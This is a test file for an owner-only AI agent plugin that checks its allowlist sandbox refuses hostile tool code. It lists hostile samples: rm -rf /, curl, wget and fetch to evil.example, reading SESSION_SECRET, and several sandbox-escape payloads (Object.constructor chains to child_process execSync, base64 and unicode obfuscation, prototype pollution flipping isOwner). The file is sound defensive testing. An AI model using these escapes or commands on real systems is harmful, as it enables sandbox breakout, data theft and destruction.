// Todo 27 — Harden the owner AI agent plugin (plugins/owner/agent.js)
// Cases live here so `node --test tests/unit.test.mjs` (the lane aggregator) runs them.
//
// The behavioural cases import the plugin module inside a child process: the module
// starts timers and touches the filesystem on import, so it must not be imported
// into the test runner itself.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, existsSync, rmSync, readdirSync, mkdirSync, copyFileSync, symlinkSync, writeFileSync, mkdtempSync, realpathSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { execFileSync, spawnSync } from 'node:child_process'
import { tmpdir } from 'node:os'

const here = dirname(fileURLToPath(import.meta.url))
const ROOT = join(here, '..')
const AGENT_REL = join('plugins', 'owner', 'agent.js')
const AGENT = join(ROOT, AGENT_REL)
const src = readFileSync(AGENT, 'utf8')

// ── helper: run a probe inside a child process that imports the plugin ────
const PROBE = `
import fs from 'node:fs'
import path from 'node:path'
import { pathToFileURL } from 'node:url'

const url = pathToFileURL(process.env.T27_AGENT).href
const mod1 = await import(url)
const timersAfterFirstLoad = global.__agentTimers ? global.__agentTimers.size : -1
// second load with a different query => the framework re-evaluates the module on hot reload
const mod2 = await import(url + '?t=' + Date.now() + '&r=' + Math.random())
const timersAfterSecondLoad = global.__agentTimers ? global.__agentTimers.size : -1

// heartbeat (ActivityStatus) must register itself and must be released on stop()
const conn = { sendMessage: async () => ({ key: { id: 'probe' } }) }
const status = new mod2.ActivityStatus(conn, 'chat', {})
await status.init()
const timersWithHeartbeat = global.__agentTimers ? global.__agentTimers.size : -1
await status.stop()
const timersAfterStop = global.__agentTimers ? global.__agentTimers.size : -1

const samples = JSON.parse(process.env.T27_SAMPLES || '[]')
const checks = []
for (const s of samples) {
  let verdict = null
  let err = null
  try { verdict = mod2.safetyCheckToolCode(s.code) } catch (e) { err = String((e && e.message) || e) }
  checks.push({ name: s.name, verdict, err })
}

let npmResult = null
try { npmResult = await mod2.toolNpm('left-pad') } catch (e) { npmResult = 'THREW: ' + String((e && e.message) || e) }

// runtime enforcement of the restricted tool context (path escapes / protected paths)
let ctxEscape = null
let ctxProtected = null
try {
  const ctx = mod2.buildToolContext('probe')
  try { ctx.fs.writeFileSync('/etc/passwd', 'x') } catch (e) { ctxEscape = String((e && e.message) || e) }
  try { ctx.fs.readFileSync('.env') } catch (e) { ctxProtected = String((e && e.message) || e) }
} catch (e) { ctxEscape = 'SETUP: ' + String((e && e.message) || e) }

// cleanup: the import creates the (empty) agent-tools folder — remove it again
try {
  const toolsDir = path.join(process.cwd(), 'agent-tools')
  if (fs.existsSync(toolsDir) && fs.readdirSync(toolsDir).length === 0) fs.rmSync(toolsDir, { recursive: true, force: true })
} catch {}

// shared/global state that a hostile tool must NOT be able to touch
let polluted = null
let ownerFlip = false
let toolAxiosTimeout = null
try {
  polluted = ({}).pollutedByTool
  ownerFlip = ({}).isOwner === true
  toolAxiosTimeout = mod2.buildToolContext('probe').axios.defaults.timeout
} catch {}

process.stdout.write('__T27__' + JSON.stringify({
  timersAfterFirstLoad,
  timersAfterSecondLoad,
  timersWithHeartbeat,
  timersAfterStop,
  checks,
  npmResult,
  ctxEscape,
  ctxProtected,
  polluted: polluted === undefined ? null : polluted,
  ownerFlip,
  toolAxiosTimeout,
  allowedGlobals: mod2.TOOL_ALLOWED_GLOBALS.size,
  ctxProps: [...mod2.TOOL_CTX_PROPS],
  httpTimeout: mod2.HTTP_TIMEOUT_MS
}) + '\\n')
process.exit(0)
`

function probe(samples) {
  const out = execFileSync(process.execPath, ['--input-type=module', '-e', PROBE], {
    cwd: ROOT,
    encoding: 'utf8',
    timeout: 60000,
    env: { ...process.env, T27_AGENT: AGENT, T27_SAMPLES: JSON.stringify(samples || []) },
    stdio: ['ignore', 'pipe', 'pipe']
  })
  const line = out.split('\n').find((l) => l.startsWith('__T27__'))
  assert.ok(line, 'probe did not return a result (stdout: ' + out.slice(0, 400) + ')')
  return JSON.parse(line.slice('__T27__'.length))
}

// ── 1. source scans (the acceptance criteria of todo 27) ─────────────────
test('agent guards: no unbounded HTTP timeout is left in the agent plugin', () => {
  const hits = [...src.matchAll(/timeout\s*:\s*0\b/g)].map((m) => m[0])
  assert.deepEqual(hits, [], 'plugins/owner/agent.js still has "timeout: 0"')
  assert.ok(!/axios\.defaults\.timeout\s*=\s*0/.test(src), 'the global axios timeout override is still there')
  // every axios call must carry one of the bounded timeouts
  const axiosCalls = [...src.matchAll(/axios\.(get|post)\(/g)].length
  const bounded = [...src.matchAll(/timeout:\s*HTTP_TIMEOUT_[A-Z_]+/g)].length
  assert.ok(axiosCalls > 0 && bounded >= axiosCalls, 'axios calls: ' + axiosCalls + ', bounded timeouts: ' + bounded)
})

test('agent guards: no shell execution and no runtime npm install', () => {
  assert.ok(!/shell\s*:\s*true/.test(src), 'a shell:true option is still present')
  assert.ok(!/execFile\s*\(/.test(src), 'child_process.execFile is still used')
  assert.ok(!/npm['"]?\s*,\s*\[\s*['"]install/.test(src), 'the npm install path is still present')
  assert.ok(!/from\s+['"]child_process['"]/.test(src) || !/\bexecFile\b(?<!Sync)/.test(src), 'execFile is still imported')
  // the only child_process usage left is node --check, and it is bounded + shell-free
  const exec = src.match(/execFileSync\([^)]*\)/) || ['']
  assert.match(exec[0], /process\.execPath/)
  assert.match(exec[0], /timeout:\s*\d+/)
  assert.ok(!/shell/.test(exec[0]))
})

test('agent guards: the agent stays owner-only', () => {
  assert.match(src, /handler\.owner\s*=\s*true/)
  assert.match(src, /handler\.category\s*=\s*'owner'/)
  // the user facing commands are untouched
  assert.match(src, /handler\.command\s*=\s*\['صانع', 'صنع-بلوقن', 'plugin-agent'\]/)
})

test('agent guards: the sandbox is an allowlist, not a blocklist', () => {
  // the old blocklist markers are gone
  assert.ok(!/ممنوع child_process/.test(src), 'the old blocklist is still in place')
  assert.match(src, /TOOL_ALLOWED_GLOBALS/)
  assert.match(src, /TOOL_ALLOWED_FS/)
  assert.match(src, /TOOL_CTX_PROPS/)
  // and the allowlist is real (not empty)
  const r = probe([])
  assert.ok(r.allowedGlobals > 20, 'the allowlist looks empty: ' + r.allowedGlobals)
  assert.ok(r.ctxProps.includes('axios') && r.ctxProps.includes('readText'))
})

// ── 2. behavioural: the allowlist sandbox ─────────────────────────────────
test('agent guards: the sandbox refuses everything outside the allowlist', () => {
  const hostile = [
    { name: 'rm -rf /', code: 'rm -rf /' },
    { name: 'curl', code: 'curl https://evil.example/x' },
    { name: 'wget', code: 'wget https://evil.example/x' },
    { name: 'npm install', code: "execFile('npm', ['install', 'left-pad'])" },
    { name: 'child_process', code: "const cp = require('child_process')" },
    { name: 'execSync', code: "execSync('rm -rf /')" },
    { name: 'process.env', code: 'const secret = process.env.SESSION_SECRET' },
    { name: 'eval', code: 'eval("1+1")' },
    { name: 'new Function', code: 'new Function("return process")()' },
    { name: 'fetch', code: 'await fetch("https://evil.example")' },
    { name: 'setTimeout', code: 'setTimeout(() => {}, 10)' },
    { name: 'fs.rmSync', code: 'fs.rmSync("/tmp/x", { recursive: true })' },
    { name: 'globalThis', code: 'globalThis.process.exit(1)' },
    { name: 'require', code: "const fs2 = require('fs')" },
    { name: 'dynamic import', code: "await import('node:child_process')" },
    // ── attempt 2: the reviewer-verified escapes (structural sandbox) ──
    { name: 'reviewer exact escape', code: "export default async function (args, ctx) {\n  return Object.constructor('return process.getBuiltinModule(\"child_process\").execSync(\"id\").toString()')()\n}" },
    { name: 'process.getBuiltinModule', code: "export default async function (args, ctx) { return process.getBuiltinModule('child_process').execSync('id') }" },
    { name: 'Object.constructor', code: "export default async function (args, ctx) { return Object.constructor('return process')() }" },
    { name: 'Object.prototype pollution', code: "export default async function (args, ctx) { Object.prototype.x = 1; return 1 }" },
    { name: 'arrow Object.constructor', code: "export default async function (args, ctx) { return ((Object)=>Object.constructor('return process')())(Object) }" },
    { name: 'array constructor chain', code: "export default async function (args, ctx) { return [].constructor.constructor('return process')() }" },
    { name: 'Function constructor', code: "export default async function (args, ctx) { return Function('return process')() }" },
    { name: 'new Function', code: "export default async function (args, ctx) { return new Function('return this')() }" },
    { name: 'globalThis.process', code: "export default async function (args, ctx) { return globalThis.process }" },
    { name: 'ctx.axios.defaults mutation', code: "export default async function (args, ctx) { ctx.axios.defaults.timeout = 0; return 1 }" },
    { name: 'Reflect.get(process, env)', code: "export default async function (args, ctx) { return Reflect.get(process, 'env') }" },
    { name: 'process.binding', code: "export default async function (args, ctx) { return process.binding }" },
    { name: 'iframe srcdoc', code: "export default async function (args, ctx) { return '<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>' }" },
    { name: 'prototype destructuring', code: "export default async function (args, ctx) { const { constructor: c } = (() => {}); return c('return process')() }" },
    { name: 'hidden identifier (string concat)', code: "export default async function (args, ctx) { const k = ['con', 'structor'].join(''); return Object[k]('return process')() }" },
    { name: 'hidden identifier (unicode escape)', code: "export default async function (args, ctx) { return Object['\\u0063onstructor']('return process')() }" },
    { name: 'hidden identifier (base64 rebuild)', code: "export default async function (args, ctx) { return Object[Buffer.from('Y29uc3RydWN0b3I=', 'base64').toString()]('return process')() }" }
  ]
  const r = probe(hostile)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw instead of returning a verdict')
    assert.ok(typeof c.verdict === 'string' && c.verdict.length > 0, c.name + ' was ALLOWED by the sandbox')
    assert.match(c.verdict, /غير مسموح/, c.name + ' was refused without the Arabic "غير مسموح" marker: ' + c.verdict)
  }
})

test('agent guards: the sandbox accepts the documented safe operations', () => {
  const safe = [
    {
      name: 'ctx read/list',
      code: "export default async function (args, ctx) {\n  const text = ctx.readText('package.json')\n  const files = ctx.listDir('plugins')\n  return { text, files }\n}"
    },
    {
      name: 'ctx fs + path',
      code: "export default async function (args, ctx) {\n  const p = ctx.path.join(ctx.ROOT, 'package.json')\n  const raw = ctx.fs.readFileSync(p, 'utf8')\n  return raw.length\n}"
    },
    {
      name: 'ctx axios',
      code: "export default async function (args, ctx) {\n  const r = await ctx.axios.get('https://example.com')\n  return String(r.data).slice(0, 100)\n}"
    },
    {
      name: 'pure computation',
      code: 'export default async function (args, ctx) {\n  const n = Number(args.n || 1)\n  return Math.round(n * 2)\n}'
    }
  ]
  const r = probe(safe)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw: ' + c.err)
    assert.equal(c.verdict, null, c.name + ' was refused: ' + c.verdict)
  }
})

test('agent guards: a tool call attempting npm install is refused in Arabic', () => {
  const r = probe([])
  assert.ok(r.npmResult, 'the npm_install tool returned nothing')
  assert.match(r.npmResult, /غير مسموح/)
  assert.ok(!/تم تثبيت/.test(r.npmResult), 'the npm_install tool still reports a successful install')
})

// ── 3. behavioural: the lifecycle timers are single instance ──────────────
test('agent guards: hot reload does not stack the module timers', () => {
  const r = probe([])
  // one models-cache refresh interval per loaded module
  assert.equal(r.timersAfterFirstLoad, 1, 'expected exactly one module timer after the first load')
  // the second load (hot reload) clears the first one instead of stacking
  assert.equal(r.timersAfterSecondLoad, 1, 'the reload stacked a second module timer')
  // the heartbeat registers itself and is released on stop
  assert.equal(r.timersWithHeartbeat, 2, 'the heartbeat did not register itself')
  assert.equal(r.timersAfterStop, 1, 'the heartbeat was not released on stop')
})

test('agent guards: the tool HTTP client is bounded', () => {
  const r = probe([])
  assert.ok(r.httpTimeout >= 10000 && r.httpTimeout <= 30000, 'unexpected HTTP timeout: ' + r.httpTimeout)
  assert.match(src, /const toolAxios = axios\.create\(\{ timeout: HTTP_TIMEOUT_MS/)
})

test('agent guards: the agent cannot rewrite its own sandbox', () => {
  // plugins/owner/agent.js is protected from the agent's write_file tool
  assert.ok(
    src.includes("/^plugins[\\\\/]owner[\\\\/]agent\\.js$/i"),
    'the agent plugin file is not in the protected-write list'
  )
})

test('agent guards: the tool context cannot escape the project folder', () => {
  const r = probe([])
  assert.ok(r.ctxEscape, 'the probe did not report the runtime escape attempt')
  assert.match(r.ctxEscape, /خارج المشروع/)
  assert.ok(r.ctxProtected, 'the probe did not report the runtime protected-path attempt')
  assert.match(r.ctxProtected, /مسار محمي/)
})

// ═══════════════════════════════════════════════════════════════════════════
//  ATTEMPT 2 — the structural sandbox (the reviewer-verified escape is closed)
// ═══════════════════════════════════════════════════════════════════════════

// ── the reviewer's exact escape payload (shell through Object.constructor) ─
const REVIEWER_PAYLOAD = "export default async function (args, ctx) {\n  return Object.constructor('return process.getBuiltinModule(\"child_process\").execSync(\"id\").toString()')()\n}"

// ── the reviewer's probe, run against a scratch copy of the plugin ────────
// (same payload + same create_tool call; the last import is guarded so the
//  script reports "tool file = false" instead of crashing when it is refused)
const ESCAPE_PROBE = `
import { pathToFileURL } from 'node:url'
import path from 'node:path'
import fs from 'node:fs'
const mod = await import(pathToFileURL(path.join(process.cwd(), 'plugins/owner/agent.js')).href)
const payload = 'export default async function (args, ctx) {\\n  return Object.constructor(\\'return process.getBuiltinModule("child_process").execSync("id").toString()\\')()\\n}'
console.log('safetyVerdict =', JSON.stringify(mod.safetyCheckToolCode(payload)))
console.log('create_tool   =', await mod.toolCreateTool({ name: 'pwn_probe', description: 'x', code: payload }))
const toolFile = path.join(process.cwd(), 'agent-tools/pwn_probe.js')
console.log('tool file     =', fs.existsSync(toolFile))
if (fs.existsSync(toolFile)) {
  const t = await import(pathToFileURL(toolFile).href)
  console.log('tool output   =', JSON.stringify(await t.default({}, mod.buildToolContext('pwn_probe'))))
}
console.log('prototype     =', JSON.stringify({ x: ({}).x === undefined ? null : ({}).x, isOwner: ({}).isOwner === true }))
console.log('axios timeout =', mod.buildToolContext('pwn_probe').axios.defaults.timeout)
process.exit(0)
`

// runs the reviewer probe inside a throw-away copy of the plugin (never in the worktree)
function runEscapeProbe() {
  const tmp = mkdtempSync(join(tmpdir(), 't27-escape-'))
  try {
    mkdirSync(join(tmp, 'plugins', 'owner'), { recursive: true })
    copyFileSync(AGENT, join(tmp, 'plugins', 'owner', 'agent.js'))
    symlinkSync(realpathSync(join(ROOT, 'node_modules')), join(tmp, 'node_modules'), 'dir')
    writeFileSync(join(tmp, 'probe.mjs'), ESCAPE_PROBE)
    const res = spawnSync(process.execPath, ['probe.mjs'], { cwd: tmp, encoding: 'utf8', timeout: 60000 })
    return {
      status: res.status,
      out: res.stdout || '',
      err: res.stderr || '',
      toolFileExists: existsSync(join(tmp, 'agent-tools', 'pwn_probe.js'))
    }
  } finally {
    rmSync(tmp, { recursive: true, force: true })
  }
}

test('agent guards: the reviewer sandbox escape is closed end to end', () => {
  const r = runEscapeProbe()
  const all = r.out + r.err
  assert.ok(r.out.includes('safetyVerdict ='), 'the probe did not report a sandbox verdict:\n' + all)
  // 1) the checker REFUSES the payload (verdict value, not a log line)
  const verdictLine = r.out.split('\n').find((l) => l.startsWith('safetyVerdict =')) || ''
  assert.ok(!/safetyVerdict = null/.test(verdictLine), 'the escape payload is still ALLOWED: ' + verdictLine)
  assert.match(verdictLine, /غير مسموح/, 'the escape payload was refused without the Arabic marker: ' + verdictLine)
  // 2) create_tool refuses it (no "created" reply)
  const createLine = r.out.split('\n').find((l) => l.startsWith('create_tool   =')) || ''
  assert.match(createLine, /غير مسموح/, 'create_tool did not refuse the payload: ' + createLine)
  assert.ok(!createLine.includes('تم إنشاء'), 'create_tool still reports the tool as created: ' + createLine)
  // 3) the tool file was never written, so nothing can be executed
  assert.equal(r.toolFileExists, false, 'the refused tool was still written to disk')
  assert.match(r.out, /tool file     = false/, 'the probe did not confirm the missing tool file:\n' + all)
  // 4) NO shell was spawned (the reviewer probe printed "uid=0(root)" before the fix)
  assert.ok(!/uid=\d|root\)\s*gid|execSync/.test(all), 'the probe produced shell output:\n' + all)
  // 5) the shared state is untouched
  assert.match(r.out, /prototype     = \{"x":null,"isOwner":false\}/, 'the prototype was polluted:\n' + all)
  assert.match(r.out, /axios timeout = 30000/, 'the shared axios timeout was mutated:\n' + all)
})

test('agent guards: prototype pollution and shared config mutation are refused', () => {
  const hostile = [
    { name: 'Object.prototype.x = 1', code: "export default async function (args, ctx) { Object.prototype.x = 1; return 1 }" },
    { name: 'Object.prototype.pollutedByTool', code: "export default async function (args, ctx) { Object.prototype.pollutedByTool = 123; return 1 }" },
    { name: 'o.__proto__.x = 1', code: "export default async function (args, ctx) { const o = {}; o.__proto__.x = 1; return 1 }" },
    { name: 'ctx.axios.defaults.timeout = 0', code: "export default async function (args, ctx) { ctx.axios.defaults.timeout = 0; return 1 }" },
    { name: 'axios.defaults.timeout = 0', code: "export default async function (args, ctx) { axios.defaults.timeout = 0; return 1 }" },
    { name: 'Object.assign(ctx.axios.defaults)', code: "export default async function (args, ctx) { Object.assign(ctx.axios.defaults, { timeout: 0 }); return 1 }" },
    { name: 'Object.assign(Object.prototype)', code: "export default async function (args, ctx) { Object.assign(Object.prototype, { isOwner: true }); return 1 }" }
  ]
  const r = probe(hostile)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw instead of returning a verdict')
    assert.equal(typeof c.verdict, 'string', c.name + ' was ALLOWED by the sandbox')
    assert.match(c.verdict, /غير مسموح/, c.name + ' was refused without the Arabic marker: ' + c.verdict)
  }
  // the shared state of the process is still clean
  assert.equal(r.polluted, null, 'Object.prototype was polluted: ' + r.polluted)
  assert.equal(r.ownerFlip, false, '({}).isOwner flipped to true')
  assert.equal(r.toolAxiosTimeout, 30000, 'the shared tool axios timeout was changed: ' + r.toolAxiosTimeout)
})

test('agent guards: the sandbox decision is structural, not a string scan', () => {
  // a) identifiers hidden inside string literals / unicode escapes / base64 are still denied
  const hidden = [
    { name: 'string concat', code: "export default async function (args, ctx) { const k = ['con', 'structor'].join(''); return Object[k]('return process')() }" },
    { name: 'unicode escape in the key', code: "export default async function (args, ctx) { return Object['\\u0063onstructor']('return process')() }" },
    { name: 'unicode escape in the identifier', code: "export default async function (args, ctx) { const O = Obj\\u0065ct; return O['constructor']('return process')() }" },
    { name: 'base64 rebuild', code: "export default async function (args, ctx) { return Object[Buffer.from('Y29uc3RydWN0b3I=', 'base64').toString()]('return process')() }" },
    { name: 'computed ctx access', code: "export default async function (args, ctx) { return ctx['ax' + 'ios'].defaults.timeout }" },
    { name: 'reflection API', code: "export default async function (args, ctx) { return Object.getOwnPropertyDescriptor(Object, 'constructor').value('return process')() }" },
    { name: 'getPrototypeOf', code: "export default async function (args, ctx) { return Object.getPrototypeOf(() => {}).constructor('return process')() }" },
    { name: 'dynamic key on a function value', code: "export default async function (args, ctx) { const k = String.fromCharCode(99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114); return (() => {})[k]('return process')() }" },
    { name: 'defineProperty on the prototype', code: "export default async function (args, ctx) { Object.defineProperty(Object.prototype, 'x', { value: 1 }); return 1 }" }
  ]
  const r = probe(hidden)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw instead of returning a verdict')
    assert.equal(typeof c.verdict, 'string', c.name + ' was ALLOWED by the sandbox')
    assert.match(c.verdict, /غير مسموح/, c.name + ' was refused without the Arabic marker: ' + c.verdict)
  }
  // b) the word "constructor"/"process" inside a harmless string is NOT a reason to refuse
  const safeText = [{
    name: 'dangerous words inside a string literal',
    code: "export default async function (args, ctx) { return 'the process reports a constructor count' }"
  }]
  const r2 = probe(safeText)
  for (const c of r2.checks) {
    assert.equal(c.err, null, c.name + ' threw: ' + c.err)
    assert.equal(c.verdict, null, c.name + ' was refused (the decision must be structural): ' + c.verdict)
  }
})

test('agent guards: the structural sandbox keeps the documented safe surface', () => {
  const safe = [
    { name: 'ctx read/list', code: "export default async function (args, ctx) {\n  const text = ctx.readText('package.json')\n  const files = ctx.listDir('plugins')\n  return { text, files }\n}" },
    { name: 'ctx fs + path', code: "export default async function (args, ctx) {\n  const p = ctx.path.join(ctx.ROOT, 'package.json')\n  const raw = ctx.fs.readFileSync(p, 'utf8')\n  return raw.length\n}" },
    { name: 'ctx axios', code: "export default async function (args, ctx) {\n  const r = await ctx.axios.get('https://example.com')\n  return String(r.data).slice(0, 100)\n}" },
    { name: 'pure computation', code: "export default async function (args, ctx) {\n  const n = Number(args.n || 1)\n  return Math.round(n * 2)\n}" },
    { name: 'global axios client', code: "export default async function (args, ctx) {\n  const r = await axios.get('https://example.com')\n  return String(r.status)\n}" },
    { name: 'ctx fs facade', code: "export default async function (args, ctx) {\n  return ctx.fs.existsSync('package.json')\n}" },
    { name: 'json/math/date', code: "export default async function (args, ctx) {\n  return JSON.stringify({ d: Date.now(), m: Math.min(1, 2), s: new Set([1]) })\n}" },
    { name: 'args + map', code: "export default async function (args, ctx) {\n  const list = args.list || []\n  return list.map((x) => String(x).length)\n}" },
    { name: 'template literal', code: "export default async function (args, ctx) {\n  return `value: ${args.n || 0}`\n}" },
    { name: 'destructuring with a default', code: "export default async function (args, ctx) {\n  const { n = 2 } = args\n  try { return Math.pow(n, 2) } catch (e) { return 0 }\n}" },
    { name: 'local computed access', code: "export default async function (args, ctx) {\n  const o = { a: 1 }\n  const k = 'a'\n  return o[k]\n}" },
    { name: 'array literal + map', code: "export default async function (args, ctx) {\n  const list = args.list || []\n  return list.map((x) => String(x).length)\n}" },
    { name: 'ctx listDir index', code: "export default async function (args, ctx) {\n  return ctx.listDir('plugins')[0]\n}" }
  ]
  const r = probe(safe)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw: ' + c.err)
    assert.equal(c.verdict, null, c.name + ' was refused: ' + c.verdict)
  }
})
